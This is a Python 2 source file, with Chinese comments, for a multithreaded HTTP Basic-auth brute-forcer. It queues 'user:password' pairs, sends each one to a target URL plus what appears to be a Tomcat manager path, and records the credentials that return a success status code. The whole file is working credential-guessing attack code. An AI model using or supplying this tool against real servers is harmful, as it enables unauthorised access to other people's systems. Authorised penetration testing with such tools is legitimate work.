#encoding: utf-8
#传递一个queue队列，判断是否该队列内URL的HTTP请求状态，是否符合config内定义的exclude_status状态码
#email: ringzero@0x557.org
#some code hacked 
import sys
import threading
import Queue
import re
import pdb
from config import *
from base64 import b64encode
from common import *

class FuzzEnginer1(object):
	"""docstring for FuzzEnginer"""
	def __init__(self, url,passwords):
		super(FuzzEnginer1, self).__init__()
		tmp_uri = sys.argv[3] if len(sys.argv) == 4 else tomcat_uri 
		self.url = url + tmp_uri 
		self.passwords = passwords

	class FuzzWorker(threading.Thread):
		def __init__(self, queue ,url):
			threading.Thread.__init__(self)
			self.queue = queue
			self.url = url

		def run(self):
			while True:
				if self.queue.empty():
					break

				if not checksite_isalive(self.url):
					break

				try: # 用hack方法，no_timeout读取Queue队列，直接异常退出线程避免阻塞
					password = self.queue.get_nowait()
					#print password
					#password格式: admin:123456
					headers = {
						'Authorization':'Basic ' + b64encode(password.strip()),
						#'User-Agent': random_useragent(allow_random_useragent),
						#'X_FORWARDED_FOR': random_x_forwarded_for(allow_random_x_forward),
					}
					'''
					if "tomcat:tomcat" in password:
						pdb.set_trace()
					'''
					results = http_request_get0(self.url,headers)
					# print "[%s] %s => %s" % (results.status_code, url, results.url) # 客户端调试信息
					if results.status_code in success_status:
						#resources[results.status_code][self.url] = {'request':results.url,'password':password}
						resources[results.status_code] = {'request':results.url,'password':password.strip()}
						#print resources
						print "[%s] %s => %s" % (results.status_code, results.url, password) # 客户端调试信息	
						
				except Exception, e: # 队列阻塞
					# print e
					break

	def start(self):

		global resources
		resources = {}
		count = 0

		queue = Queue.Queue()
		for password in self.passwords: # 生成任务队列
			queue.put(password)
			count += 1
		for status_code in exclude_status: # 初始化全局状态码数据
			resources[status_code] = {}
			#print resources
		threads = [] # 初始化线程组
		for i in xrange(threads_count):
			threads.append(self.FuzzWorker(queue,self.url))
		for t in threads: # 启动线程
			t.start()
		for t in threads: # 等待线程执行结束后，回到主线程中
			t.join()

		return resources,count

